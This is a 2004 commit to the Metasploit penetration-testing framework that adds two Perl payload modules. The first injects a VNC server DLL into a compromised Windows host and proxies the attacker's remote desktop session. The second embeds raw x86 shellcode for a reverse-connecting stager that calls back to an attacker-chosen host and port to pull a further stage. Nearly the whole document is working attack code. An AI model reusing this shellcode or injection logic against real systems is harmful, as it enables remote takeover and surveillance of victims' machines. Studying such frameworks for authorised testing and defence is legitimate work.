24db151432073fc3b7e9f88994563a4b2ba035d9
Spoon M <spoonm@gmail.com>
2004-10-31 21:41:35 +0000

    All sorts of payload foo, mostly ordinal centric.

---
+++ lib/Msf/PayloadComponent/Win32InjectVncStage.pm
@@ -0,0 +1,142 @@
+
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::PayloadComponent::Win32InjectVncStage;
+use strict;
+use base 'Msf::PayloadComponent::Win32InjectLibStage';
+use FindBin qw{$RealBin};
+
+
+my $info =
+{
+  'Authors'      => [
+                        'Matt Miller <mmiller [at] hick.org> [Unknown License]',
+                        'Jarkko Turkulainen <jt [at] klake.org> [Unknown License]',
+                    ],
+  'UserOpts'     => { 
+                        'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
+                        'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
+                        'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
+                    },
+                
+};
+
+sub new {
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHashRec($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
+}
+
+sub _InjectDLL {
+  my $self = shift;
+  return $self->GetVar('VNCDLL');
+}
+
+sub _InjectDLLName
+{
+	my $self = shift;
+
+	return "hax0r.dll"; # randomize me!
+}
+
+sub HandleConnection {
+  my $self = shift;
+  my $sock = $self->SocketOut;
+  $self->SUPER::HandleConnection;
+  sleep(1);
+
+  # Create listener socket
+  my $lis = IO::Socket::INET->new(
+    'Proto'     => 'tcp',
+    'ReuseAddr' => 1,
+    'Listen'    => 5,
+    'Blocking'  => 0,
+    'LocalPort' => $self->GetVar('VNCPORT'),
+  );  
+  
+  if (! $lis) {
+    $self->PrintLine("[*] Problem creating the VNC proxy listener: $@");
+    $self->KillChild;    
+    return;  
+  }
+  
+  $self->PrintLine('[*] VNC proxy listening on port '.$lis->sockport.'...');
+  
+  if ($self->GetVar('AUTOVNC')) {
+    my $pid = fork();
+    if (! $pid) {
+        system("vncviewer 127.0.0.1:".$self->GetVar('VNCPORT'));
+        exit(0);
+    }
+  }
+  
+  
+  # Accept connection from user
+  my $sel = IO::Select->new($lis);
+  my $clock = time();
+  my $mwait = 300;
+  my $csock;
+  
+  while (! $csock && time < ($clock+$mwait))
+  {
+    foreach ($sel->can_read(0.25)) { $csock = $lis->accept() }
+  }
+  
+  if (! $csock) {
+    $self->PrintLine('[*] VNC proxy did not recieve connection before timeout');
+    $self->KillChild;    
+    return;
+  } 
+  
+  $self->VNCProxy($sock, $csock);
+  $self->PrintLine('[*] VNC proxy finished');
+  
+  $sock->close;
+  $csock->close;
+  $self->KillChild;
+  return;
+}
+
+sub VNCProxy {
+  my $self = shift;
+  my $srv = shift;
+  my $cli = shift;
+
+  foreach ($srv, $cli) {
+    $_->blocking(1);
+    $_->autoflush(1);
+  }
+
+  my $selector = IO::Select->new($srv, $cli);
+
+  LOOPER:
+    while(1) {
+      my @ready = $selector->can_read;
+      foreach my $ready (@ready) {
+        if($ready == $cli) {
+          my $data;
+          $cli->recv($data, 8192);
+          last LOOPER if (! length($data));     
+          last LOOPER if(!$srv || !$srv->connected);
+          $srv->send($data);
+        }
+        elsif($ready == $srv) {
+          my $data;
+          $srv->recv($data, 8192);
+          last LOOPER if(!length($data));
+          last LOOPER if(!$cli || !$cli->connected);
+          $cli->send($data);
+        }
+      }
+    }
+}
+
+1;
---
+++ lib/Msf/PayloadComponent/Win32ReverseOrdinalStager.pm
@@ -0,0 +1,44 @@
+package Msf::PayloadComponent::Win32ReverseOrdinalStager;
+use strict;
+use base 'Msf::PayloadComponent::Win32Payload';
+sub load {
+  Msf::PayloadComponent::Win32Payload->import('Msf::PayloadComponent::ReverseConnection');
+}
+
+my $info =
+{
+    'Authors'      =>
+      [
+        'spoonm <ninjatools [at] hush.com>',
+        'skape <mmiller@hick.org>',
+        'vlad902 <vlad902@gmail.com>',
+      ],
+    'Arch'         => [ 'x86' ],
+    'Priv'         => 0,
+    'OS'           => [ 'win32' ],
+    'Multistage'   => 1,
+    'Size'         => '',
+
+    # win32 specific code
+    'Win32Payload' =>
+    {
+        Offsets => { 'LPORT' => [75, 'n'], 'LHOST' => [68, 'ADDR']},
+        Payload =>
+"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b".
+"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a".
+"\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x41".
+"\x58\x01\xe8\x8b\x71\x3c\x01\xee\x03\x69\x0c\x53\x6a\x01\x6a\x02".
+"\xff\xd0\x97\x68\x7f\x00\x00\x01\x68\x02\x00\x22\x11\x89\xe1\x53".
+"\xb7\x0c\x53\x51\x57\x51\x6a\x10\x51\x57\x56\xff\xe5",
+#      ^- 0x0c00 recv len (3072)
+    },
+};
+
+sub new {
+    load();
+    my $class = shift;
+    my $hash = @_ ? shift : { };
+    $hash = $class->MergeHashRec($hash, {'Info' => $info});
+    my $self = $class->SUPER::new($hash, @_);
+    return($self);
+}
